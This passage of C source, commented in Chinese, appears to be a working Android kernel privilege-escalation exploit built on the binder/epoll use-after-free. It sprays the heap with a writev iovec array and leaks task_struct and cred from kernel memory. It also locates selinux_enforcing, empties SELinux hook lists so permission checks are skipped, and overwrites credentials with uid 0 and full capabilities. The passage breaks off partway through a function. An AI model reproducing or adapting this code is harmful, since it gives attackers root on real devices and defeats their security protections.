	if ((fcntl(pipefd[0], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl pipefd[0] size failed!", __FUNCTION__, __LINE__);
	if ((fcntl(pipefd[1], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl pipefd[1] size failed!", __FUNCTION__, __LINE__);

	fork_ret = fork();
	if (fork_ret == -1){
		error("[ERROR] %s %d : fork child failed!", __FUNCTION__, __LINE__);
		goto err_lt_fork;
	}
	else if (fork_ret == 0){
		/* Child process */
		unsigned long list_next = 0;
		unsigned long list_prev = 0;
		struct leak_data leak = {0,};
		unsigned long kdat = 0;
		char page_buffer[ONE_PAGE_SIZE];
		memset(page_buffer, 0, sizeof(page_buffer));

		if(prctl(PR_SET_PDEATHSIG, SIGKILL)){
			error("[ERROR] %s %d : CHILD: prctl PR_SET_PDEATHSIG failed!", __FUNCTION__, __LINE__);
		}
		/* 等待父进程阻塞后调度 */
		usleep(DELAY_USEC);
		/* 4、第一次触发漏洞，会进行链表删除操作 */
		if(epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event)){
			error("[ERROR] %s %d : CHILD: epoll_ctl EPOLL_CTL_DEL failed!", __FUNCTION__, __LINE__);
		}
		/* 5、读取第一组数据，数据内容是mmap_addr中第一页数据，无用数据
		 *    这里会将管道缓冲区读空，会唤醒父进程可以往管道写数据了 */
		if (read(pipefd[0], page_buffer, ONE_PAGE_SIZE) != ONE_PAGE_SIZE){
			error("[ERROR] %s %d : CHILD: read pipefd[0] first page failed!", __FUNCTION__, __LINE__);
		}
		/* 7、读取第二组数据，由于管道被读空会被阻塞，等待父进程将第二组数据写入管道
		 *    当父进程写完第二组的一页数据后继续阻塞，子进程被唤醒继续读取第二组数据
		 *    数据的内容是iovec_array[indx_wait].iov_len对应的内核地址k_next往后的一页数据，
		 *    从而泄露内核数据，其中包括进程的task_struct指针 */
		if (read(pipefd[0], page_buffer, ONE_PAGE_SIZE) != ONE_PAGE_SIZE){
			error("[ERROR] %s %d : CHILD: read pipefd[0] second page failed!", __FUNCTION__, __LINE__);
		}
		//hexdump_memory((unsigned char *)page_buffer, 0x100);//sizeof(page_buffer));

		/* 泄露的next和prev指针必须相等 */
		list_next = *(unsigned long *)(page_buffer);
		list_prev = *(unsigned long *)((unsigned char *)page_buffer + sizeof(void*));
		/* 从泄露的内核数据中获取task指针 */
		leak.task = *(unsigned long *)(page_buffer + dev_info->offset_binder_next_task);
		//printf(">>> CHILD: list_next = 0x%lx; list_prev = 0x%lx\n", list_next, list_prev);
		//printf(">>> CHILD: task_struct == 0x%lx\n", leak.task);

		/* 9、修改   iovec_array[indx_wait + 3].iov_base = task_struct
		 *    等待父进程写第四组数据时将task_struct内容写入管道中，之后子进程再读取管道数据
		 *    从而泄露task_struct内容 */
		if((leak.task > KERNEL_ADDR_START) && (list_next == list_prev) && (list_next > KERNEL_ADDR_START)){
			unsigned long extra[] = {
				/* 需要泄露的内核地址，这里是需要泄露的task地址 */
				leak.task,
				/* 需要泄露的数据的长度，这里固定一个页 */
				ONE_PAGE_SIZE
			};
			struct clobber_gdata gdata[] = {
				{
					/* 要修改的地址，这里就是iovec_array[indx_wait + 3].iov_base对应的内核地址 */
					.dst = list_next + offset,
					/* 写入数据的地址 */
					.src = (void*)&extra,
					/* 写入数据的长度 */
					.len = sizeof(extra),
				},
			};
			/* 调用任意写函数，成功修改返回1 */
			ret = clobber_group_data_corrbase(binder_fd, epfd, gdata, ARRAY_SIZE(gdata));
		}

		/* 10、读取第三组数据，无用数据，之后唤醒父进程继续写管道 */
		if (read(pipefd[0], page_buffer, ONE_PAGE_SIZE) != ONE_PAGE_SIZE){
			error("[ERROR] %s %d : CHILD: read pipefd[0] third page failed!", __FUNCTION__, __LINE__);
		}
		/* 12、读取第四组数据，数据内容是task_struct */
		if (read(pipefd[0], page_buffer, ONE_PAGE_SIZE) != ONE_PAGE_SIZE){
			error("[ERROR] %s %d : CHILD: read pipefd[0] fourth page failed!", __FUNCTION__, __LINE__);
		}
		//hexdump_memory((unsigned char *)page_buffer, ONE_PAGE_SIZE);
		/* 解析task_struct数据 */
		if(ret){
			if(dev_info->offset_task_stack){
				leak.stack = *(unsigned long*)(page_buffer + dev_info->offset_task_stack);
			}
			/* 如果内核栈偏移不正确，在task中找第一个内核地址的值认为是内核栈地址 */
			if(leak.stack < KERNEL_ADDR_START){
				for(int i = 0; i < 10; i++){
					kdat = *(unsigned long*)(page_buffer + i*sizeof(void*));
					if(kdat > KERNEL_ADDR_START){
						leak.stack = kdat;
						dev_info->offset_task_stack = i*sizeof(void*);
						printf(">>> stack offset = 0x%x\n", dev_info->offset_task_stack);
						break;
					}
				}
			}
			/* 查找task结构体的前10个值，判断是否有USER_DS，如果有说明thread_info内嵌在task结构体 */
			for(int i = 0; i < 10; i++){
				kdat = *(unsigned long*)(page_buffer + i*sizeof(void*));
				if(kdat == USER_DS){
					leak.thread = leak.task;
					dev_info->offset_addr_limit = i*sizeof(void*);
					//printf(">>> thread_info in task_struct, addr_limit = 0x%lx; offset = 0x%x\n", kdat, dev_info->offset_addr_limit);
					break;
				}
				//printf(">>> task [%d] 0x%lx\n", i, kdat);
			}
			/* 前面没有找到addr_limit，那么 thread_info 等于内核栈地址 */
			if(leak.thread < KERNEL_ADDR_START){
				leak.thread = leak.stack;
			}
			/* 如果参数中指定cred偏移，则直接读取cred指针 */
			if(dev_info->offset_task_cred){
				leak.cred = *(unsigned long*)(page_buffer + dev_info->offset_task_cred);
			}
			else{
				offset = get_cred_offset((void*)page_buffer, ONE_PAGE_SIZE);
				if(-1 != offset){
					leak.cred = *(unsigned long*)(page_buffer + offset);
					dev_info->offset_task_cred = offset;
					printf(">>> cred offset = 0x%x\n", offset);
				}
				else{
					printf(">>> get cred offset failed!\n");
				}
			}
			if(dev_info->offset_task_sched_class){
				leak.kaddr = *(unsigned long*)(page_buffer + dev_info->offset_task_sched_class);
			}
			else{
				offset = get_sched_class_offset((void*)page_buffer, ONE_PAGE_SIZE);
				if(offset){
					leak.kaddr = *(unsigned long*)(page_buffer + offset);
					dev_info->offset_task_sched_class = offset;
					printf(">>> sched_class offset = 0x%x\n", offset);
				}
				else{
					printf(">>> get sched_class offset failed!\n");
				}
			}
			//printf(">>> CHILD: thread_info = 0x%lx\n", leak.thread);
			//printf(">>> CHILD: cred = 0x%lx\n", leak.cred);
			//printf(">>> CHILD: kaddr = 0x%lx\n", leak.kaddr);
			status = 1;
		}

		/* 通过管道将泄露的数据传递给父进程 */
        if(write(leakpipe[1], &leak, sizeof(leak)) != sizeof(leak))
			error("[ERROR] %s %d : CHILD: write leakpipe[1] failed!", __FUNCTION__, __LINE__);

		/* 通知父进程泄露信息状态 */
		if(write(leakpipe[1], &status, sizeof(status)) != sizeof(status))
			error("[ERROR] %s %d : CHILD: write leakpipe[1] failed!", __FUNCTION__, __LINE__);

        close(pipefd[0]);
        close(pipefd[1]);
        close(leakpipe[0]);
        close(leakpipe[1]);
		exit(0);
	}
	/* Parent process */
	/* 2、释放 binder_thread 结构体 */
	if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)){
		error("[ERROR] %s %d : PARENT: ioctl binder_fd BINDER_THREAD_EXIT failed!", __FUNCTION__, __LINE__);
	}
	/* 3、堆喷，抢占刚被释放 binder_thread 所占的内存
	 *    写第一组数据，由于管道大小被修改为一个页面，所以会阻塞等待读取数据
	 *    总共四组数据，都是一个页大小，所以每写一组数据都会阻塞，等待读数据
	 * 6、子进程运行后触发漏洞，并读取第一组数据，此时管道为空可以继续往管道写数据
	 *    此时的iovec_array数据变化如下
	 *    iovec_array[indx_wait].iov_base = 0x100010001;
	 *    iovec_array[indx_wait].iov_len = k_next;//next指针对应的内核地址
	 *    // 第一组数据已经写入管道，所以没有影响
	 *    // 第二组数据的iov_base变成iovec_array[indx_wait].iov_len对应的内核地址k_next
	 *    // 此次写管道就会将k_next往后的一页数据写入管道，之后由于管道没有空间而阻塞，等待子进程读取数据
	 *    iovec_array[indx_wait + 1].iov_base = k_next;
	 *    iovec_array[indx_wait + 1].iov_len = 0x1000;
	 *    iovec_array[indx_wait + 2].iov_base = 0x100000000;
	 *    iovec_array[indx_wait + 2].iov_len = 0x1000;
	 *    iovec_array[indx_wait + 3].iov_base = 0x100000000;
	 *    iovec_array[indx_wait + 3].iov_len = 0x1000;
	 * 8、子进程读取第二组数据后，管道为空，唤醒父进程继续写第三组数据，之后再次阻塞等待子进程读取数据
	 * 11、子进程读取第三组数据之后将修改iovec_array[indx_wait + 3].iov_base = task_struct
	 *    此时的iovec_array数据变化如下，此时继续写管道会将task_struct内容写入管道
	 *    iovec_array[indx_wait + 3].iov_base = task_struct;
	 *    iovec_array[indx_wait + 3].iov_len = 0x1000; */
	ret = writev(pipefd[1], iovec_array, iovec_array_count);
	if(ret == -1){
		error("[ERROR] %s %d : PARENT: writev failed!", __FUNCTION__, __LINE__);
	}

	/* 从子进程读取泄露的内核信息 */
	ret = read(leakpipe[0], dat, sizeof(struct leak_data));
	if(ret != sizeof(struct leak_data)){
		error("[ERROR] %s %d : PARENT: read leak_data failed!", __FUNCTION__, __LINE__);
	}

	/* 等待子进程退出 */
	if (wait(&status) != fork_ret){
		error("[ERROR] %s %d : PARENT: wait child failed", __FUNCTION__, __LINE__);
	}

	/* 读取子进程发送状态 */
	ret = read(leakpipe[0], &status, sizeof(status));
	if(ret != sizeof(status)){
		error("[ERROR] %s %d : PARENT: read status failed!", __FUNCTION__, __LINE__);
	}

err_lt_fork:
	close(pipefd[0]);
	close(pipefd[1]);
	close(leakpipe[0]);
	close(leakpipe[1]);
err_lt_ctl_add:
	free(iovec_array);
err_lt_iovec_array:
	return status;
}
#endif

int clobber_group_data_retry(int binder_fd, int epfd, struct clobber_gdata* gdata, int count)
{
	int retry = 0;

	while (retry < RETRIES && !dev_info->clobber_group_data(binder_fd, epfd, gdata, count)) {
		//printf(">>> clobber_group_data_retry [%d]\n", retry);
		retry++;
	}
	if(retry >= RETRIES){
		printf(">>> clobber_group_data_retry failed\n");
	}

	return retry < RETRIES;
}

int leak_group_data_retry(int binder_fd, int epfd, struct leak_gdata* gdata)
{
	int retry = 0;

	while (retry < RETRIES && !dev_info->leak_group_data(binder_fd, epfd, gdata)) {
		//printf(">>> leak_group_data retrying [%d]\n", retry);
		retry++;
	}

	if(retry >= RETRIES){
		printf(">>> leak_group_data failed\n");
	}

	return retry < RETRIES;
}

int leak_task_retry(int binder_fd, int epfd, struct leak_data* dat)
{
	int retry = 0;

	while (retry < RETRIES && !dev_info->leak_task(binder_fd, epfd, dat)) {
		//printf(">>> leak_task retrying [%d]\n", retry);
		retry++;
	}

	if(retry >= RETRIES){
		printf(">>> leak_task failed\n");
	}

	return retry < RETRIES;
}

#ifdef CONFIG_EXPLOIT_ROOT
/* 查找 selinux_enforcing 的内核地址 */
unsigned long find_selinux_enforcing(int binder_fd, int epfd)
{
	int ret = 0;
	int size = 0x200;
	void* maddr = malloc(size);
	if(!maddr){
		error("[ERROR] %s %d : malloc failed", __FUNCTION__, __LINE__);
		return 0;
	}
	memset(maddr, 0, size);
	unsigned long selinux_enforcing = kallsyms_lookup_name("selinux_enforcing");
	unsigned long sel_read_enforce = kallsyms_lookup_name("sel_read_enforce");
	unsigned long sel_write_enforce = kallsyms_lookup_name("sel_write_enforce");
	unsigned long enforcing_setup = kallsyms_lookup_name("enforcing_setup");
	unsigned long selinux_init = kallsyms_lookup_name("selinux_init");
	unsigned long selinux_kernel_status_page = kallsyms_lookup_name("selinux_kernel_status_page");
	unsigned long security_sid_mls_copy = kallsyms_lookup_name("security_sid_mls_copy");
	unsigned long security_validate_transition = kallsyms_lookup_name("security_validate_transition");
	unsigned long compute_sid_handle_invalid_context = kallsyms_lookup_name("compute_sid_handle_invalid_context");
	unsigned long avc_denied = kallsyms_lookup_name("avc_denied");

#if 0
	printf("    sel_read_enforce             = 0x%lx\n", sel_read_enforce);
	printf("    sel_write_enforce            = 0x%lx\n", sel_write_enforce);
	printf("    enforcing_setup              = 0x%lx\n", enforcing_setup);
	printf("    selinux_init                 = 0x%lx\n", selinux_init);
	printf("    selinux_kernel_status_page   = 0x%lx\n", selinux_kernel_status_page);
	printf("    security_sid_mls_copy        = 0x%lx\n", security_sid_mls_copy);
	printf("    security_validate_transition = 0x%lx\n", security_validate_transition);
	printf("    avc_denied                   = 0x%lx\n", avc_denied);
	printf("    compute_sid_handle_invalid_context = 0x%lx\n", compute_sid_handle_invalid_context);
#endif
	/* 首先在内核符号表中查找 selinux_enforcing */
	if(selinux_enforcing){
		//printf("    find selinux_enforcing in kernel symbol!\n");
		return selinux_enforcing;
	}
	printf(">>> can not find selinux_enforcing in kernel symbol!\n");

	/* 符号表中没有找到selinux_enforcing，解析代码查找 selinux_enforcing 地址 */
	printf(">>> Find selinux_enforcing in code!\n");

	/* 在函数 sel_read_enforce 中查找 selinux_enforcing */
	if(sel_read_enforce){
		struct leak_gdata gdata[] = {
			{
				.dst = sel_read_enforce,
				.src = maddr,
				.len = size,
			},
		};
		
		ret = leak_group_data_retry(binder_fd, epfd, gdata);
		if(ret){
			//write_buf_to_file(maddr, size);
			//hexdump_memory(maddr, size);
			selinux_enforcing = find_selinux_enforcing_by_selre(maddr, size, sel_read_enforce);
			if(selinux_enforcing){
				printf(">>> find selinux_enforce in sel_read_enforce success!\n");
				goto end_fse_ret;
			}
			else{
				printf(">>> find selinux_enforce in sel_read_enforce failed!\n");
			}
		}
		else{
			printf(">>> find selinux_enforce in sel_read_enforce leak_group_data_retry failed!\n");
		}
	}

	/* 在函数 selinux_kernel_status_page 中查找 selinux_enforcing */
	if(selinux_kernel_status_page){
		struct leak_gdata gdata[] = {
			{
				.dst = selinux_kernel_status_page,
				.src = maddr,
				.len = size,
			},
		};
		
		ret = leak_group_data_retry(binder_fd, epfd, gdata);
		if(ret){
			//write_buf_to_file(maddr, size);
			//hexdump_memory(maddr, size);
			selinux_enforcing = find_selinux_enforcing_by_selre(maddr, size, selinux_kernel_status_page);
			if(selinux_enforcing){
				printf(">>> find selinux_enforce in selinux_kernel_status_page success!\n");
				goto end_fse_ret;
			}
			else{
				printf(">>> find selinux_enforce in selinux_kernel_status_page failed!\n");
			}
		}
		else{
			printf(">>> find selinux_enforce in selinux_kernel_status_page leak_group_data_retry failed!\n");
		}
	}

	/* 在函数 compute_sid_handle_invalid_context 中查找 selinux_enforcing */
	if(compute_sid_handle_invalid_context){
		struct leak_gdata gdata[] = {
			{
				.dst = compute_sid_handle_invalid_context,
				.src = maddr,
				.len = size,
			},
		};

		ret = leak_group_data_retry(binder_fd, epfd, gdata);
		if(ret){
			//write_buf_to_file(maddr, size);
			//hexdump_memory(maddr, size);
			selinux_enforcing = find_selinux_enforcing_by_comshic(maddr, size, compute_sid_handle_invalid_context);
			if(selinux_enforcing){
				printf(">>> find selinux_enforce in compute_sid_handle_invalid_context success!\n");
				goto end_fse_ret;
			}
			else{
				printf(">>> find selinux_enforce in compute_sid_handle_invalid_context failed!\n");
			}
		}
		else{
			printf(">>> find selinux_enforce in compute_sid_handle_invalid_context leak_group_data_retry failed!\n");
		}
	}

	if(!selinux_enforcing){
		printf(">>> find selinux_enforcing failed in code!\n");
	}
end_fse_ret:
	free(maddr);
	return selinux_enforcing;
}

#else

/* 查找 selinux_enforcing 的内核地址 */
unsigned long find_selinux_enforcing(int binder_fd, int epfd)
{
	int ret = 0;
	int size = 0x200;
	void* maddr = malloc(size);
	if(!maddr){
		error("[ERROR] %s %d : malloc failed", __FUNCTION__, __LINE__);
		return 0;
	}
	memset(maddr, 0, size);
	unsigned long selinux_enforcing = kallsyms_lookup_name("selinux_enforcing");
	unsigned long sel_read_enforce = kallsyms_lookup_name("sel_read_enforce");
	unsigned long sel_write_enforce = kallsyms_lookup_name("sel_write_enforce");
	unsigned long enforcing_setup = kallsyms_lookup_name("enforcing_setup");
	unsigned long selinux_init = kallsyms_lookup_name("selinux_init");
	unsigned long selinux_kernel_status_page = kallsyms_lookup_name("selinux_kernel_status_page");
	unsigned long security_sid_mls_copy = kallsyms_lookup_name("security_sid_mls_copy");
	unsigned long security_validate_transition = kallsyms_lookup_name("security_validate_transition");
	unsigned long compute_sid_handle_invalid_context = kallsyms_lookup_name("compute_sid_handle_invalid_context");
	unsigned long avc_denied = kallsyms_lookup_name("avc_denied");

#if 0
	printf("    sel_read_enforce             = 0x%lx\n", sel_read_enforce);
	printf("    sel_write_enforce            = 0x%lx\n", sel_write_enforce);
	printf("    enforcing_setup              = 0x%lx\n", enforcing_setup);
	printf("    selinux_init                 = 0x%lx\n", selinux_init);
	printf("    selinux_kernel_status_page   = 0x%lx\n", selinux_kernel_status_page);
	printf("    security_sid_mls_copy        = 0x%lx\n", security_sid_mls_copy);
	printf("    security_validate_transition = 0x%lx\n", security_validate_transition);
	printf("    avc_denied                   = 0x%lx\n", avc_denied);
	printf("    compute_sid_handle_invalid_context = 0x%lx\n", compute_sid_handle_invalid_context);
#endif
	/* 首先在内核符号表中查找 selinux_enforcing */
	if(selinux_enforcing){
		//printf("    find selinux_enforcing in kernel symbol!\n");
		return selinux_enforcing;
	}
	printf(">>> can not find selinux_enforcing in kernel symbol!\n");

	/* 符号表中没有找到selinux_enforcing，解析代码查找 selinux_enforcing 地址 */
	printf(">>> Find selinux_enforcing in code!\n");

	/* 在函数 selinux_kernel_status_page 中查找 selinux_enforcing */
	if(sel_read_enforce){
		ret = kernel_read((void*)sel_read_enforce, maddr, size);
		if(!ret){
			//write_buf_to_file(maddr, size);
			//hexdump_memory(maddr, size);
			selinux_enforcing = find_selinux_enforcing_by_selre(maddr, size, sel_read_enforce);
			if(selinux_enforcing){
				printf(">>> find selinux_enforce in sel_read_enforce success!\n");
				goto end_fse_ret;
			}
			else{
				printf(">>> find selinux_enforce in sel_read_enforce failed!\n");
			}
		}
		else{
			printf(">>> read sel_read_enforce  failed!\n");
		}
	}

	if(!selinux_enforcing){
		printf(">>> find selinux_enforcing failed in code!\n");
	}
end_fse_ret:
	free(maddr);
	return selinux_enforcing;
}

#endif

#ifdef CONFIG_EXPLOIT_ROOT
/* 泄露内核函数代码 */
int leak_code(int binder_fd, int epfd, unsigned long kaddr)
{
	int ret = 0;
	int size = 0x200;
	void* maddr = malloc(size);
	if(!maddr){
		error("[ERROR] %s %d : malloc failed", __FUNCTION__, __LINE__);
		return 0;
	}
	memset(maddr, 0, size);

	printf("    kaddr = 0x%lx\n", kaddr);

	struct leak_gdata gdata[] = {
		{
			.dst = kaddr,
			.src = maddr,
			.len = size,
		},
	};
	
	ret = leak_group_data_retry(binder_fd, epfd, gdata);
	if(ret){
		write_buf_to_file(maddr, size);
		hexdump_memory(maddr, size);
		read_file_to_buf(maddr, size);
		hexdump_memory(maddr, size);
	}

	return 0;
}

/*
 * 函数: leak_kernel
 * 参数: base, 拷贝内核数据的起始地址
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞任意读，读取内核数据
 */
int leak_kernel(int binder_fd, int epfd, unsigned long base)
{
	int ret = 0;

	mmap_addr = mmap((void*)MMAP_ADDR, dev_info->kern_copy_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (mmap_addr != (void*)MMAP_ADDR){
		error("[ERROR] %s %d : mmap kern_copy_size failed!", __FUNCTION__, __LINE__);
		return -1;
	}
	memset(mmap_addr, 0, dev_info->kern_copy_size);

	struct leak_gdata gdata[] = {
		{
			.dst = base,
			.src = mmap_addr,
			.len = dev_info->kern_copy_size,
		},
	};

	ret = leak_group_data_retry(binder_fd, epfd, gdata);
	if(!ret){
		printf(">>> Test leak_group_data_retry failed!\n");
	}

	return ret;
}

/*
 * 函数: hook_selinux
 * 参数: 如果 flag == DEVINFO_OFFSET_SELINUX_NO，kaddr = security_file_open 的内核地址
 *		 如果 flag == DEVINFO_OFFSET_SELINUX_OK，kaddr = security_hook_heads 的内核地址
 * 返回: security_hook_heads的内核地址
 * 说明: 通过将selinux的hook链表security_hook_heads中的下面几个链表置空，即可绕过部分
 *       selinux的权限检查
 *       capable、inode_permission、inode_setattr、inode_getattr、file_permission、file_open
 *       kaddr 是 security_file_open 的内核地址
 */
unsigned long hook_selinux(int binder_fd, int epfd, unsigned long kaddr, int flag)
{
	int ret = -1, i, j;
	unsigned int offset = 0;
	unsigned long haddr = 0;
	int size = 0x200;
	void* maddr = NULL;

	if(flag == DEVINFO_OFFSET_SELINUX_NO){
		maddr = malloc(size);
		if(!maddr){
			error("[ERROR] %s %d : malloc failed", __FUNCTION__, __LINE__);
			return 0;
		}
		memset(maddr, 0, size);

		struct leak_gdata gdata[] = {
			{
				.dst = kaddr,
				.src = maddr,
				.len = size,
			},
		};
		if(!leak_group_data_retry(binder_fd, epfd, gdata)){
			error("[ERROR] %s %d : leak code failed", __FUNCTION__, __LINE__);
			goto err_hook_ret;
		}

		haddr = analyze_selinux((unsigned char*)maddr, kaddr, &offset);
		if(haddr < KERNEL_ADDR_START){
			printf("[ERROR] %s %d : analyze_selinux failed", __FUNCTION__, __LINE__);
			goto err_hook_ret;
		}
		else{
			printf("    security_hook_heads = 0x%lx\n", haddr);
		}
	}
	else if(flag == DEVINFO_OFFSET_SELINUX_OK){
		haddr = kaddr;
	}
	else{
		printf("[ERROR] flag 参数错误\n");
		goto err_hook_ret;
	}
	//printf("	  security_hook_heads = 0x%lx\n", haddr);

	unsigned long hvalue[6] = {
		haddr + dev_info->selinux_hook_capable,
		haddr + dev_info->selinux_hook_inode_permission,
		haddr + dev_info->selinux_hook_inode_setattr,
		haddr + dev_info->selinux_hook_inode_getattr,
		haddr + dev_info->selinux_hook_file_permission,
		haddr + dev_info->selinux_hook_file_open
	};
	struct clobber_gdata cgdata[6];
	for(i = 0; i < 6; i++){
		cgdata[i].dst = hvalue[i];
		cgdata[i].src = (void*)&hvalue[i];
		cgdata[i].len = sizeof(long);
		//printf("[%3d] haddr: [0x%lx]\n", i, hvalue[i]);
	}
	//ret = clobber_group_data_retry(binder_fd, epfd, cgdata, ARRAY_SIZE(cgdata));
	if(!clobber_group_data_retry(binder_fd, epfd, cgdata, ARRAY_SIZE(cgdata))){
		error("clobber_group_data_retry hook addr failed!\n");
		goto err_hook_ret;
	}		
#if 0
	unsigned long srcval;
	struct clobber_gdata cgval;
	// 33 61 77
	for(i = 6; i < 73; i++){
		if(i==33 || i==61 || i==77) continue;
		else if(i==36 || i==6 || i==7) continue;
		else if(i>=9 && i<=35) continue;
		else if(i>=37 && i<=45) continue;
		else if(i>=49 && i<=59) continue;
		else if(i>=61 && i<=71) continue;
		//if(i==46 || i==60 || i==63 || i==72 || i==72){
			srcval = haddr + i*0x10;
			cgval.dst = haddr + i*0x10;
			cgval.src = (void*)&srcval;
			cgval.len = sizeof(srcval);
			ret = clobber_group_data_retry(binder_fd, epfd, &cgval, 1);
			if(!ret){
				error("clobber_group_data_retry hook addr failed!\n");
			}
			printf("[%3d] haddr: [0x%lx]\n", i, haddr + i*0x10);
		//}
	}
#endif

#if 0
	free(maddr);
	maddr = malloc(HOOK_HEADS_NUM*0x10);
	if(!maddr){
		error("[ERROR] %s %d : malloc failed", __FUNCTION__, __LINE__);
		return -1;
	}
	memset(maddr, 0, size);
	struct leak_gdata lgdata[] = {
		{
			.dst = haddr,
			.src = maddr,
			.len = size,
		},
	};
	
	ret = leak_group_data_retry(binder_fd, epfd, lgdata);
	if(!ret){
		error("leak_group_data_retry hook addr failed!\n");
		return -1;
	}
	for(i = 0; i < HOOK_HEADS_NUM/*size/0x10*/; i++){
		printf("[%3d] haddr: [0x%lx] 0x%lx, 0x%lx\n", i, (unsigned long)((char*)haddr + i*0x10), *(unsigned long*)((char*)maddr + i*0x10), *(unsigned long*)((char*)maddr + i*0x10 + 8));
	}
#endif
#if 0
	if(0 == getuid()){
		printf("Get root!\n");
	}
	if(-1 == open("/data/dalvik-cache/arm64/test.txt", O_RDWR | O_CREAT)){
		error("open /data/dalvik-cache/arm64/test.txt failed! errno: %d, %s\n", errno, strerror(errno));
	}
	else{
		printf("open /data/dalvik-cache/arm64/test.txt OK!\n");
	}
#endif
err_hook_ret:
	free(maddr);

	return haddr;
}


#else
int leak_kernel(int binder_fd, int epfd, unsigned long base)
{
	int i;

	mmap_addr = mmap((void*)MMAP_ADDR, dev_info->kern_copy_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (mmap_addr != (void*)MMAP_ADDR){
		error(">>> %s %d : mmap 4g aligned page failed!", __FUNCTION__, __LINE__);
		return -1;
	}
	memset(mmap_addr, 0, dev_info->kern_copy_size);

	/* 读取内核数据，用于解析内核符号表 */
	for(i = 0; i < dev_info->kern_copy_size/ONE_PAGE_SIZE; i++){
		if(kernel_read((void*)(base + i*ONE_PAGE_SIZE), mmap_addr + i*ONE_PAGE_SIZE, ONE_PAGE_SIZE))
			printf(">>> %s %d : kernel_read ksym failed! 0x%lx\n", __FUNCTION__, __LINE__, base + i*ONE_PAGE_SIZE);
	}

	return 0;
}
#endif


/*
 * 函数: leak_cred
 * 参数: cred, 拷贝cred的起始地址
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞任意读，读取cred内容
 */
int leak_cred(int binder_fd, int epfd, unsigned long cred)
{
	int ret = 0;
	struct cred pcred;

	if(cred < KERNEL_ADDR_START){
		return ret;
	}

	struct leak_gdata gdata[] = {
		{
			.dst = cred,
			.src = (void*)&pcred,
			.len = sizeof(pcred),
		},
	};
	
	ret = leak_group_data_retry(binder_fd, epfd, gdata);
	if(!ret){
		printf(">>> Test leak_group_data_retry failed!\n");
	}
	printf("cred:\n");
	printf("    0x%x\n", pcred.usage.counter);
	printf("    0x%x\n", pcred.uid);
	printf("    0x%x\n", pcred.gid);
	printf("    0x%x\n", pcred.suid);
	printf("    0x%x\n", pcred.sgid);
	printf("    0x%x\n", pcred.euid);
	printf("    0x%x\n", pcred.egid);
	printf("    0x%x\n", pcred.fsuid);
	printf("    0x%x\n", pcred.fsgid);
	printf("    0x%x\n", pcred.securebits);
	printf("    0x%x\n", pcred.cap_inheritable.cap[0]);
	printf("    0x%x\n", pcred.cap_inheritable.cap[1]);
	printf("    0x%x\n", pcred.cap_permitted.cap[0]);
	printf("    0x%x\n", pcred.cap_permitted.cap[1]);
	printf("    0x%x\n", pcred.cap_effective.cap[0]);
	printf("    0x%x\n", pcred.cap_effective.cap[1]);
	printf("    0x%x\n", pcred.cap_bset.cap[0]);
	printf("    0x%x\n", pcred.cap_bset.cap[1]);
	printf("    0x%x\n", pcred.cap_ambient.cap[0]);
	printf("    0x%x\n", pcred.cap_ambient.cap[1]);

	return ret;
}

/*
 * 函数: patch_cred_selinux
 * 参数: selinux, selinux_enforcing的内核地址; cred, cred内核地址
 * 返回: 成功返回1，失败返回0
 * 说明: 修改 cred 和 selinux_enforcing 达到提权
 */
int patch_cred_selinux(int binder_fd, int epfd, unsigned long selinux, unsigned long cred)
{
	int ret = 0;
	unsigned int pselinux[] = {
		0,
	};
	struct cred pcred;
	pcred.usage.counter = 0x26;
	pcred.uid = 0;
	pcred.gid = 0;
	pcred.suid = 0;
	pcred.sgid = 0;
	pcred.euid = 0;
	pcred.egid = 0;
	pcred.fsuid = 0;
	pcred.fsgid = 0;
	pcred.securebits = 0;
	pcred.cap_inheritable.cap[0] = 0xffffffff;
	pcred.cap_inheritable.cap[1] = 0xffffffff;
	pcred.cap_permitted.cap[0] = 0xffffffff;
	pcred.cap_permitted.cap[1] = 0xffffffff;
	pcred.cap_effective.cap[0] = 0xffffffff;
	pcred.cap_effective.cap[1] = 0xffffffff;
	pcred.cap_bset.cap[0] = 0xffffffff;
	pcred.cap_bset.cap[1] = 0xffffffff;
	pcred.cap_ambient.cap[0] = 0xffffffff;
	pcred.cap_ambient.cap[1] = 0xffffffff;

	if(selinux > KERNEL_ADDR_START && cred > KERNEL_ADDR_START){
		struct clobber_gdata gdata_selinux_cred[] = {
			{
				.dst = selinux,
				.src = (void*)&pselinux,
				.len = sizeof(pselinux),
			},
			{
				.dst = cred,
				.src = (void*)&pcred,
				.len = sizeof(pcred),
			},
		};
		ret = clobber_group_data_retry(binder_fd, epfd, gdata_selinux_cred, ARRAY_SIZE(gdata_selinux_cred));
	}
	else if(selinux > KERNEL_ADDR_START){
		struct clobber_gdata gdata_selinux[] = {
			{
				.dst = selinux,
				.src = (void*)&pselinux,
				.len = sizeof(pselinux),
			},
		};
		ret = clobber_group_data_retry(binder_fd, epfd, gdata_selinux, ARRAY_SIZE(gdata_selinux));
	}
	else if(cred > KERNEL_ADDR_START){
		struct clobber_gdata gdata_cred[] = {
			{
				.dst = cred,
				.src = (void*)&pcred,
				.len = sizeof(pcred),
			},
		};
		ret = clobber_group_data_retry(binder_fd, epfd, gdata_cred, ARRAY_SIZE(gdata_cred));
	}

	return ret;
}

/*
 * 函数: patch_addr_limit_cred
 * 参数: addr_limit, addr_limit内核地址; cred, 当前进程cred内核地址
 * 返回: 成功返回真，失败返回假
 * 说明: 利用漏洞修改 addr_limit 和 cred
 */
int patch_addr_limit_cred(int binder_fd, int epfd, unsigned long addr_limit, unsigned long cred)
{
	int ret = 0;
	unsigned long extra[] = {
		0xffffffffffffffff,
	};
	struct cred pcred;
	pcred.usage.counter = 0x17;
	pcred.uid = 0;
	pcred.gid = 0;
	pcred.suid = 0;
	pcred.sgid = 0;
	pcred.euid = 0;
	pcred.egid = 0;
	pcred.fsuid = 0;
	pcred.fsgid = 0;
	pcred.securebits = 0;
	pcred.cap_inheritable.cap[0] = 0xffffffff;
	pcred.cap_inheritable.cap[1] = 0xffffffff;
